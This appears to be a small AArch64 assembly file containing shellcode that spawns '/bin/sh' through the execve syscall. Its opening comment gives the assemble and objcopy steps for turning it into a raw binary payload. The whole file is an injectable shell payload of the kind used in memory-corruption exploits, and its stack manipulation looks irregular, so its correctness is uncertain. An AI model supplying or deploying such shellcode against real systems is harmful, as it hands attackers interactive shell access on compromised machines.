/*
        assemble with as sh.asm -o sh.o
        get raw binary with objcopy -O binary sh.o sh.bin
*/

        .text
        .global _start

_start:
        nop
        nop
        b shell
execve:
        sub sp, sp, #256
        mov x0, x30
        eor x2, x2, x2
        str x2, [sp]
        add sp, sp, 4
        str x2, [sp]
        add sp, sp, 4
        mov x1, sp
        mov x2, 0x0
        mov x3, 0x0
        mov x8, #221
        svc 0x0
                

exit:
        eor x0, x0, x0
        mov x8, #93
        svc 0x0

shell:
        bl execve
        .asciz "/bin/sh"        
